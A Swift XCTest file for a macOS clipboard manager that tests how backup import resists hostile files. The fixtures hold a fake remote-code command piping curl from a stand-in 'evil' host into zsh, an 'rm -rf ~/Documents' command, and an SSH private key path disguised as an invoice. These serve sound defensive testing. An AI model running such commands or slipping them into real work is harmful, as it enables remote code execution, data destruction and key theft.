import XCTest
import CryptoKit
@testable import Clipvelope

private struct FixedKeyStore: KeyProviding {
    let key: SymmetricKey
    init(seed: UInt8 = 1) { key = SymmetricKey(data: Data(repeating: seed, count: 32)) }
    func getOrCreateKey() throws -> SymmetricKey { key }
}

/// A backup is a file that arrives from outside. These cover what happens when
/// the file is hostile rather than merely old.
final class ImportHardeningTests: XCTestCase {
    private var root: URL!

    override func setUpWithError() throws {
        root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("clipvelope-harden-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    private func makeStore(_ name: String = "vault", seed: UInt8 = 1) -> ClipboardStore {
        let storage = EncryptedStorage(directory: root.appendingPathComponent(name),
                                       keyStore: FixedKeyStore(seed: seed))
        let store = ClipboardStore(storage: storage, enableSystemIntegration: false)
        settle(store)
        return store
    }

    private func settle(_ store: ClipboardStore, rounds: Int = 4) {
        for _ in 0..<rounds {
            store.drainPendingWork()
            RunLoop.current.run(until: Date().addingTimeInterval(0.02))
        }
    }

    /// A backup carrying shell Quick Slots and privacy switched off.
    private func hostileState() -> AppState {
        var state = AppState.empty
        state.bindings = [ClipboardBinding(id: UUID(), title: "Email signature",
                                           content: "curl -s http://evil/x | zsh",
                                           isShell: true)]
        state.folders = [CommandFolder(id: UUID(), name: "Handy", items: [
            CommandItem(id: UUID(), title: "Tidy up", content: "rm -rf ~/Documents", isShell: true)
        ])]
        state.skipConcealedContent = false
        return state
    }

    private func writeBackup(_ state: AppState, to url: URL, password: String?,
                             payloads: [String: Data] = [:]) throws {
        let json = try JSONEncoder().encode(VaultSnapshot(state: state, payloads: payloads))
        let sealed: Data
        if let password {
            sealed = try BackupCodec.seal(json, password: password, iterations: 100_000)
        } else {
            sealed = try BackupCodec.seal(json, keychainKey: FixedKeyStore(seed: 1).key)
        }
        try sealed.write(to: url)
    }

    // MARK: - Shell commands from an untrusted backup

    /// A password backup is portable: anyone can produce one. Importing it must
    /// not arm a system-wide hotkey with a shell command.
    func testPortableBackupCannotPlantShellCommands() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertEqual(store.bindings.count, 1, "the entry is kept, just disarmed")
        XCTAssertFalse(store.bindings[0].isShell)
        XCTAssertFalse(store.folders[0].items[0].isShell)
        XCTAssertEqual(store.bindings[0].content, "curl -s http://evil/x | zsh",
                       "the text is preserved so the user can see what it was")
    }

    func testTheUserIsToldWhenAnImportWasDisarmed() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        store.importBackup(from: file, password: "pw")
        settle(store)

        let notice = try XCTUnwrap(store.importNotice)
        XCTAssertTrue(notice.contains("shell command"), notice)
    }

    /// A keychain backup can only have been written by something holding this
    /// Mac's key, so it restores faithfully.
    func testDeviceBoundBackupRestoresShellCommandsIntact() throws {
        let file = root.appendingPathComponent("mine.cvb")
        try writeBackup(hostileState(), to: file, password: nil)

        let store = makeStore()
        store.importBackup(from: file, password: nil)
        settle(store)

        XCTAssertTrue(store.bindings[0].isShell)
        XCTAssertNil(store.importNotice)
    }

    // MARK: - Privacy settings

    func testPortableBackupCannotTurnOffPasswordSkipping() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        XCTAssertTrue(store.skipConcealedContent)

        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertTrue(store.skipConcealedContent,
                      "an import must never weaken the privacy settings")
    }

    func testPortableBackupCannotRemoveIgnoredApps() throws {
        let store = makeStore()
        store.ignoreApp(bundleID: "com.1password.1password")
        settle(store)

        var state = AppState.empty
        state.ignoredAppBundleIDs = ["com.example.other"]
        let file = root.appendingPathComponent("b.cvb")
        try writeBackup(state, to: file, password: "pw")

        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertTrue(store.ignoredAppBundleIDs.contains("com.1password.1password"),
                      "the local ignore list must survive an import")
        XCTAssertTrue(store.ignoredAppBundleIDs.contains("com.example.other"),
                      "an import may still add to it")
    }

    // MARK: - File references

    /// The label is derived from the path, so a backup cannot show one filename
    /// and paste a different one.
    func testAFileLabelAlwaysMatchesItsPath() throws {
        let json = #"{"path":"/Users/victim/.ssh/id_rsa","name":"Q3-invoice.pdf"}"#
        let ref = try JSONDecoder().decode(ClipboardContent.FileRef.self, from: Data(json.utf8))

        XCTAssertEqual(ref.path, "/Users/victim/.ssh/id_rsa")
        XCTAssertEqual(ref.name, "id_rsa", "the stored label must be ignored")
    }

    // MARK: - KDF parameters

    func testABackupDemandingTooFewRoundsIsRejected() throws {
        let file = try BackupCodec.seal(Data("{}".utf8), password: "pw", iterations: 1)
        XCTAssertThrowsError(try BackupCodec.open(file, password: "pw")) { error in
            guard case BackupCodec.CodecError.weakKDF = error else {
                return XCTFail("expected weakKDF, got \(error)")
            }
        }
    }

    /// The header sits outside the sealed box, so it is authenticated as
    /// associated data; editing it must invalidate the file.
    func testEditingTheHeaderInvalidatesTheBackup() throws {
        var file = try BackupCodec.seal(Data("{}".utf8), password: "pw", iterations: 100_000)
        // Rewrite the iteration count in place (bytes 6..<10: magic + mode + kdf id).
        let lowered = withUnsafeBytes(of: UInt32(100_001).bigEndian, Array.init)
        file.replaceSubrange(6..<10, with: lowered)

        XCTAssertThrowsError(try BackupCodec.open(file, password: "pw"))
    }

    // MARK: - Backup settings are this Mac's, not the file's

    /// Auto backup writes the whole vault to ~/Documents, which is commonly
    /// cloud-synced. A file the user was told cannot weaken their settings must
    /// not be able to switch that on.
    func testPortableBackupCannotTurnOnAutoBackup() throws {
        let store = makeStore()
        XCTAssertFalse(store.autoBackupEnabled, "precondition")

        var state = AppState.empty
        state.items = [ClipboardItem(text: "hello")]
        state.autoBackupEnabled = true
        state.autoBackupMode = .keychain
        let url = root.appendingPathComponent("autobackup-on.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertFalse(store.autoBackupEnabled,
                       "an untrusted backup must not switch automatic backups on")
    }

    /// The inverse, which needs no hostile intent at all: AppState decodes a
    /// missing field as off, so any ordinary backup would silently retire a
    /// backup the user depends on.
    func testPortableBackupCannotTurnOffOrRetargetAutoBackup() throws {
        let store = makeStore()
        store.autoBackupEnabled = true
        store.autoBackupMode = .password
        settle(store)

        var state = AppState.empty
        state.items = [ClipboardItem(text: "hello")]
        state.autoBackupEnabled = false
        state.autoBackupMode = .keychain
        let url = root.appendingPathComponent("autobackup-off.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertTrue(store.autoBackupEnabled, "the user's own auto-backup choice must survive an import")
        XCTAssertEqual(store.autoBackupMode, .password, "and so must its mode")
    }

    // MARK: - File references from an untrusted backup

    /// A file row hands the paste target the file itself. The paths in someone
    /// else's backup describe their machine; on this one they are either dead
    /// or worth stealing.
    func testPortableBackupCannotPlantFileReferences() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false,
                          content: .files([.init(path: "/Users/victim/Downloads/Q3-report.pdf"),
                                           .init(path: "/Users/victim/.ssh/id_rsa")]),
                          sourceBundleID: nil),
            ClipboardItem(text: "an ordinary snippet"),
        ]
        let url = root.appendingPathComponent("files.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["an ordinary snippet"],
                       "file references from an untrusted backup must not become history rows")
        XCTAssertTrue(store.importNotice?.contains("file reference") ?? false,
                      "and the user must be told, got: \(store.importNotice ?? "nil")")
    }

    /// A backup this Mac's own key sealed is the user's own data, so its file
    /// rows are kept.
    func testDeviceBoundBackupKeepsFileReferences() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false,
                                     content: .files([.init(path: "/Users/me/notes.txt")]),
                                     sourceBundleID: nil)]
        let url = root.appendingPathComponent("mine.cvb")
        try writeBackup(state, to: url, password: nil)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertEqual(store.items.count, 1)
    }

    // MARK: - A vault payload is not a backup

    /// Importing a portable backup seals its payloads under the vault key. If a
    /// headerless file still counted as a device-bound backup, the user could be
    /// talked into importing one of those payload files, and it would be applied
    /// with full trust: shell Quick Slots armed, privacy settings obeyed.
    func testAVaultPayloadFileCannotBeImportedAsADeviceBoundBackup() throws {
        let store = makeStore()
        let planted = try JSONEncoder().encode(VaultSnapshot(state: hostileState(), payloads: [:]))
        let id = UUID()

        // Exactly what the import path would write: the attacker's bytes, sealed
        // with this Mac's vault key.
        let storage = EncryptedStorage(directory: root.appendingPathComponent("vault"),
                                       keyStore: FixedKeyStore(seed: 1))
        try storage.writePayload(planted, for: id)

        store.importBackup(from: storage.payloadURL(for: id), password: nil)
        settle(store)

        XCTAssertTrue(store.bindings.isEmpty, "a payload file must not import as a trusted backup")
        XCTAssertNotNil(store.backupFailure, "and the attempt must be reported")
    }

    // MARK: - Payloads inside a backup are input too

    /// Capture refuses a picture whose header declares more pixels than any
    /// decoder should allocate. A backup is the same hostile input: its payload
    /// is decoded later to draw the row's thumbnail.
    func testAnImportedImageDeclaringTooManyPixelsIsLeftOut() throws {
        let store = makeStore()
        let id = UUID()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false,
                          content: .image(.init(pixelWidth: 2, pixelHeight: 2,
                                                byteCount: 120, typeIdentifier: "public.png")),
                          sourceBundleID: nil),
            ClipboardItem(text: "an ordinary snippet"),
        ]
        let bomb = compressiblePNG(width: 9000, height: 9000)
        let url = root.appendingPathComponent("bomb.cvb")
        try writeBackup(state, to: url, password: "pw", payloads: [id.uuidString: bomb])

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["an ordinary snippet"],
                       "the decompression bomb must not become a history row")
    }

    func testAnImportedPayloadThatIsNotWhatItsItemClaimsIsLeftOut() throws {
        let png = compressiblePNG(width: 4, height: 4)
        let image = ClipboardContent.image(.init(pixelWidth: 2, pixelHeight: 2,
                                                 byteCount: png.count, typeIdentifier: "public.png"))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(Data("not a png".utf8), for: image))
        XCTAssertTrue(ClipboardStore.payloadIsAcceptable(png, for: image))

        let rtf = Data("{\\rtf1}".utf8)
        let rich = ClipboardContent.richText(.init(plainText: "hi", byteCount: rtf.count,
                                                   typeIdentifier: "public.rtf"))
        XCTAssertTrue(ClipboardStore.payloadIsAcceptable(rtf, for: rich))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(
            Data(count: ClipboardContent.RichTextInfo.maxBytes + 1), for: rich))

        // Neither of these keeps a payload file at all.
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(Data([1]), for: .text("x")))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(Data([1]), for: .files([.init(path: "/tmp/x")])))
    }

    /// `byteCount` is a claim like any other, and until now it was the one claim
    /// nothing compared against the bytes -- only clamped on decode. Three things
    /// downstream believe it: whether the payload is carried into the backups the
    /// user makes from then on, the byte budget that decides what gets evicted,
    /// and whether the file is deleted when its row goes. So a backup could file
    /// a real picture under `byteCount: 0` and have it excluded from every future
    /// backup, uncounted by the budget and undeletable by the vault.
    func testAPayloadIsRefusedWhenItsItemMisdeclaresHowManyBytesItIs() {
        let png = compressiblePNG(width: 4, height: 4)
        func image(_ bytes: Int) -> ClipboardContent {
            .image(.init(pixelWidth: 4, pixelHeight: 4, byteCount: bytes,
                         typeIdentifier: "public.png"))
        }
        XCTAssertTrue(ClipboardStore.payloadIsAcceptable(png, for: image(png.count)),
                      "an honest declaration is what every backup this app writes carries")
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(png, for: image(0)))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(png, for: image(png.count - 1)))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(png, for: image(png.count + 1)))

        let rtf = Data("{\\rtf1 formatted}".utf8)
        func rich(_ bytes: Int) -> ClipboardContent {
            .richText(.init(plainText: "formatted", byteCount: bytes, typeIdentifier: "public.rtf"))
        }
        XCTAssertTrue(ClipboardStore.payloadIsAcceptable(rtf, for: rich(rtf.count)))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(rtf, for: rich(0)))
    }

    /// And end to end: the entry goes, rather than arriving as a row the vault
    /// would then mismanage.
    func testAnImageDeclaringNoBytesDoesNotReachTheVault() throws {
        let store = makeStore()
        let id = UUID()
        let png = compressiblePNG(width: 4, height: 4)
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false,
                          content: .image(.init(pixelWidth: 4, pixelHeight: 4,
                                                byteCount: 0, typeIdentifier: "public.png")),
                          sourceBundleID: nil),
            ClipboardItem(text: "an ordinary snippet"),
        ]
        let url = root.appendingPathComponent("weightless.cvb")
        try writeBackup(state, to: url, password: "pw", payloads: [id.uuidString: png])

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["an ordinary snippet"])
        XCTAssertTrue(store.importNotice?.contains("did not match") ?? false,
                      "got: \(store.importNotice ?? "nil")")
    }

    // MARK: - What one backup may install

    /// The property, stated once and asserted everywhere an import can happen:
    /// whatever a backup did to the vault, the next thing the user copies is
    /// still recorded.
    ///
    /// It is the invariant rather than a count because the count is an
    /// implementation detail and the promise is not. The app exists to keep what
    /// you copied; a vault it can no longer add to is the product switched off.
    private func assertACopyIsStillRecorded(_ store: ClipboardStore,
                                            _ message: String,
                                            file: StaticString = #filePath,
                                            line: UInt = #line) {
        for round in 1...3 {
            let text = "copied after the import, \(round)"
            store.add(text: text)
            settle(store)
            XCTAssertEqual(store.items.first?.searchText, text,
                           "\(message) (round \(round))", file: file, line: line)
        }
    }

    /// A backup of 201-or-more entries, every one of them pinned, used to leave
    /// a vault that was over the live cap with nothing the cap was allowed to
    /// evict. The next copy went in at index 0, came straight back out as the
    /// only eviction candidate, and `add` returned having recorded nothing --
    /// for that copy and every copy after it, with no notice, no failure and no
    /// log line. `isPinned` is a plain boolean in the file, so writing one cost
    /// an attacker nothing.
    func testAPinnedFloodCannotStopTheAppRecordingWhatIsCopiedNext() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = (0..<(ClipboardStore.maxImportedItems + 50)).map {
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: true,
                          content: .text("entry \($0)"), sourceBundleID: nil)
        }
        let url = root.appendingPathComponent("flood.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.count, ClipboardStore.maxImportedItems,
                       "the entries themselves are still kept, up to the import ceiling")
        XCTAssertEqual(store.items.filter(\.isPinned).count,
                       ClipboardStore.maxImportedPinnedItems,
                       "but no more of them may stay pinned than the live cap can carry")
        XCTAssertTrue(store.importNotice?.contains("pinned") ?? false,
                      "and the user is told, got: \(store.importNotice ?? "nil")")

        assertACopyIsStillRecorded(store, "a pinned flood must not stop capture")
    }

    /// The same flood in a backup this Mac's own key sealed, which is trusted
    /// and therefore never disarmed. Nothing caps the pins here, so the history
    /// policy is on its own -- and that is the layer that also rescues a vault
    /// already saturated before this version shipped.
    func testADeviceBoundRestoreOfAFullyPinnedVaultStillRecordsTheNextCopy() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = (0..<(ClipboardStore.maxItems + 50)).map {
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: true,
                          content: .text("mine \($0)"), sourceBundleID: nil)
        }
        let url = root.appendingPathComponent("mine-flood.cvb")
        try writeBackup(state, to: url, password: nil)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertEqual(store.items.filter(\.isPinned).count, ClipboardStore.maxItems + 50,
                       "a trusted backup is the user's own data and keeps its pins")

        assertACopyIsStillRecorded(store, "a restore of the user's own vault must not stop capture")
        XCTAssertEqual(store.items.filter { !$0.isPinned }.count, 1,
                       "and the history settles one row above the cap rather than climbing")
    }

    /// Both blockers predate 0.2.0, so some vaults are already in this state and
    /// no import-side rule can reach them. This is such a vault, written to disk
    /// and then opened.
    func testAVaultAlreadySaturatedWithPinnedEntriesRecordsACopyAgain() throws {
        let storage = EncryptedStorage(directory: root.appendingPathComponent("vault"),
                                       keyStore: FixedKeyStore(seed: 1))
        var state = AppState.empty
        state.items = (0..<(ClipboardStore.maxItems + 20)).map {
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: true,
                          content: .text("pinned \($0)"), sourceBundleID: nil)
        }
        try storage.saveIndex(state)

        let store = makeStore()
        XCTAssertEqual(store.items.count, ClipboardStore.maxItems + 20,
                       "precondition: the vault loads exactly as it stood")

        assertACopyIsStillRecorded(store, "an existing saturated vault must start recording again")
    }

    /// The ordinary case the cap above must not disturb: a backup with a
    /// sensible number of pins keeps every one of them.
    func testAnOrdinaryBackupKeepsItsPins() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = (0..<10).map {
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: $0 < 3,
                          content: .text("entry \($0)"), sourceBundleID: nil)
        }
        let url = root.appendingPathComponent("ordinary.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.filter(\.isPinned).count, 3)
        XCTAssertNil(store.importNotice, "and nothing was changed to report")
        assertACopyIsStillRecorded(store, "the ordinary case must go on working")
    }

    func testAnOversizedEntryIsLeftOutOfAnImport() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [
            ClipboardItem(text: String(repeating: "x", count: ClipboardMonitor.maxTextBytes + 1)),
            ClipboardItem(text: "keep me"),
        ]
        let url = root.appendingPathComponent("huge.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["keep me"])
    }

    func testABackupWithDuplicateBindingIDsImportsWithoutDuplicates() throws {
        let store = makeStore()
        let id = UUID()
        var state = AppState.empty
        state.items = [ClipboardItem(text: "x")]
        state.bindings = [
            ClipboardBinding(id: id, title: "first", content: "a", isShell: false),
            ClipboardBinding(id: id, title: "second", content: "b", isShell: false),
        ]
        let url = root.appendingPathComponent("dupe-bindings.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.bindings.map(\.title), ["first"])
    }

    /// Losing a Quick Slot silently is indistinguishable from the feature
    /// breaking, which is the rule this codebase sets for itself.
    func testAnImportSaysWhenItLeavesQuickSlotsOut() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [ClipboardItem(text: "x")]
        state.bindings = [ClipboardBinding(
            id: UUID(), title: "huge",
            content: String(repeating: "x", count: ClipboardMonitor.maxTextBytes + 1),
            isShell: false)]
        let url = root.appendingPathComponent("fat-binding.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertTrue(store.bindings.isEmpty)
        XCTAssertTrue(store.importNotice?.contains("Quick Slot") ?? false,
                      "got: \(store.importNotice ?? "nil")")
    }

    /// A per-entry cap does not bound a total. Many entries each just under the
    /// limit still tax every future copy, because all of it is re-encrypted on
    /// each one.
    func testTheTotalInlineTextAnImportMayInstallIsBounded() throws {
        let store = makeStore()
        var state = AppState.empty
        let oneMB = String(repeating: "x", count: 1024 * 1024)
        state.items = (0..<200).map { _ in ClipboardItem(text: oneMB) }
        let url = root.appendingPathComponent("aggregate.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        let total = store.items.reduce(0) { $0 + $1.searchText.utf8.count }
        XCTAssertLessThanOrEqual(total, ClipboardStore.maxImportedInlineBytes)
        XCTAssertGreaterThan(store.items.count, 0, "but a reasonable prefix still imports")
    }

    // MARK: - The retired backup format

    /// Pre-release builds wrote headerless files. They are refused now, and the
    /// message must say why rather than blame the password.
    func testAPreReleaseBackupSaysSoRatherThanBlamingThePassword() throws {
        let store = makeStore()
        let headerless = try XCTUnwrap(
            AES.GCM.seal(Data(#"{"items":[]}"#.utf8), using: FixedKeyStore(seed: 1).key).combined)
        let url = root.appendingPathComponent("pre-release.cvb")
        try headerless.write(to: url)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertTrue(store.backupFailure?.contains("pre-release") ?? false,
                      "got: \(store.backupFailure ?? "nil")")
    }

    // MARK: - Duplicate ids

    /// Two entries under one id are refused outright, and the whole file with
    /// them.
    ///
    /// Deduplicating and importing the rest was the old answer, and it was not
    /// enough: an id is what a payload is filed under, so while two items claim
    /// one the question "which item do these bytes belong to" has two answers,
    /// and the import asks it in two places that need not agree. Refusing is one
    /// rule to be sure of instead of an ordering to keep true forever, and it
    /// costs nothing legitimate -- a vault is deduplicated before it is saved,
    /// so no backup this app writes has duplicate ids.
    func testABackupWithDuplicateItemIDsIsRefusedEntirely() throws {
        let store = makeStore()
        store.add(text: "what was already here")
        settle(store)

        let id = UUID()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("first"), sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("second"), sourceBundleID: nil),
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false, content: .text("third"), sourceBundleID: nil),
        ]
        let url = root.appendingPathComponent("dupes.cvb")
        try writeBackup(state, to: url, password: nil)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertNotNil(store.backupFailure,
                        "a refusal the user is not told about is indistinguishable from a crash")
        XCTAssertEqual(store.items.map(\.searchText), ["what was already here"],
                       "not one entry from the file reached the vault")
    }

    /// The reason the rule above is worth a whole file: the two "firsts" really
    /// do come apart.
    ///
    /// The payload check keeps the first item with a given id, and here that is
    /// a rich-text item, whose payloads are judged on nothing but a size
    /// ceiling. `disarming` then drops that item for being oversized and `apply`
    /// keeps the first survivor, which is the image -- leaving an image row
    /// whose bytes never faced the PNG signature, the declared pixel size or
    /// `acceptsImage`, and which `thumbnail(for:)` would have handed to ImageIO.
    func testABackupCannotSmuggleAnUncheckedPayloadInAsAnImage() throws {
        let store = makeStore()
        let id = UUID()
        let notAPNG = Data("GIF89a and then whatever ImageIO makes of the rest".utf8)
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false,
                          content: .richText(.init(
                              plainText: String(repeating: "x", count: ClipboardMonitor.maxTextBytes + 1),
                              byteCount: notAPNG.count, typeIdentifier: "public.rtf")),
                          sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: false,
                          content: .image(.init(pixelWidth: 2, pixelHeight: 2,
                                                byteCount: notAPNG.count,
                                                typeIdentifier: "public.png")),
                          sourceBundleID: nil),
        ]
        let url = root.appendingPathComponent("smuggled-image.cvb")
        try writeBackup(state, to: url, password: "pw", payloads: [id.uuidString: notAPNG])

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertNotNil(store.backupFailure)
        XCTAssertTrue(store.items.isEmpty, "nothing from the file reached the vault")

        // Refused before anything was written, rather than cleaned up after.
        let vault = EncryptedStorage(directory: root.appendingPathComponent("vault"),
                                     keyStore: FixedKeyStore(seed: 1))
        XCTAssertFalse(FileManager.default.fileExists(atPath: vault.payloadURL(for: id).path),
                       "no payload file may be written for a snapshot that is refused")
    }

    // MARK: - Importing into a vault that cannot be read

    /// The recovery path: the vault is unreadable, writes are suspended, and the
    /// user imports a backup to get their history back.
    ///
    /// The quarantine takes `items/` along with the index, deliberately -- an
    /// index kept without its payloads is an index whose pictures the next
    /// launch's orphan sweep deletes. But the import used to write the restored
    /// payloads into `items/` before that move, so the quarantine swallowed the
    /// very files it had just restored and every picture came back broken,
    /// deleting itself on the first click with "That image's file was missing".
    ///
    /// Both halves are asserted here, because fixing one by giving up the other
    /// is no fix: the restored payloads must be readable, and the old ones must
    /// still be sitting in their quarantine directory.
    func testImportingIntoASuspendedVaultKeepsItsPayloadsAndTheOldOnesToo() throws {
        let vaultDirectory = root.appendingPathComponent("vault")
        let storage = EncryptedStorage(directory: vaultDirectory, keyStore: FixedKeyStore(seed: 1))
        let older = UUID()
        try storage.writePayload(Data("the picture that was already here".utf8), for: older)
        // What a locked Keychain or a damaged file looks like from here.
        try Data("this is not a sealed box".utf8).write(to: storage.indexURL)

        let store = makeStore()
        XCTAssertTrue(store.writesSuspended, "precondition: the vault could not be read")

        let id = UUID()
        let png = compressiblePNG(width: 8, height: 8)
        var state = AppState.empty
        state.items = [ClipboardItem(
            id: id, createdAt: Date(), isPinned: false,
            content: .image(.init(pixelWidth: 8, pixelHeight: 8, byteCount: png.count,
                                  typeIdentifier: "public.png",
                                  contentHash: ClipboardContent.digest(png))),
            sourceBundleID: nil)]
        let url = root.appendingPathComponent("recovery.cvb")
        try writeBackup(state, to: url, password: "pw", payloads: [id.uuidString: png])

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertFalse(store.writesSuspended, "a successful import clears the suspension")
        XCTAssertEqual(store.items.count, 1)
        XCTAssertEqual(try storage.readPayload(for: id), png,
                       "the picture the import just restored must still be there")

        let quarantined = try FileManager.default
            .contentsOfDirectory(at: vaultDirectory, includingPropertiesForKeys: nil)
            .filter { $0.lastPathComponent.hasPrefix("items.unreadable-") }
        XCTAssertEqual(quarantined.count, 1, "the old payload directory was moved aside, once")
        let kept = try XCTUnwrap(quarantined.first)
            .appendingPathComponent("\(older.uuidString).cvi")
        XCTAssertTrue(FileManager.default.fileExists(atPath: kept.path),
                      "and what it held is still on disk, which is what the quarantine is for")
    }

    // MARK: - Quitting

    /// `add` enqueues the payload and `persist` the index onto a `.utility`
    /// queue, and `NSApplication.terminate` waits for neither: the last copy
    /// died with the process while the strip had already said the vault held it.
    /// Nothing in the app called `drainPendingWork`, and there was no
    /// application delegate to call it from.
    func testQuittingWaitsForTheLastCopyToReachTheVault() {
        let store = makeStore()
        store.add(text: "the last thing copied before quitting")

        XCTAssertTrue(store.flushPendingWork(timeout: 10))

        // Nothing else has drained the queue, so if the index is on disk it is
        // because the flush waited for it.
        XCTAssertEqual(makeStore().items.map(\.searchText),
                       ["the last thing copied before quitting"])
    }

    /// And it is bounded, because a Quit button that hangs is its own bug. A
    /// password export is the slowest thing the queue does -- key derivation is
    /// deliberately expensive -- so with one in front of it a zero-length
    /// deadline cannot be met.
    func testTheQuitFlushGivesUpRatherThanHangingOnAQueueThatIsBusy() {
        let store = makeStore()
        store.add(text: "something to export")
        store.exportBackup(to: root.appendingPathComponent("slow.cvb"), password: "pw")

        XCTAssertFalse(store.flushPendingWork(timeout: 0),
                       "a deadline already past must return rather than wait")
        XCTAssertTrue(store.flushPendingWork(timeout: 30),
                      "and the work itself still finishes")
    }

    func testRemovingDuplicateIDsKeepsTheFirstOccurrence() {
        let id = UUID()
        let items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("a"), sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: true, content: .text("b"), sourceBundleID: nil),
        ]
        XCTAssertEqual(items.removingDuplicateIDs().map(\.searchText), ["a"])
        XCTAssertEqual([ClipboardItem]().removingDuplicateIDs(), [])
    }
}
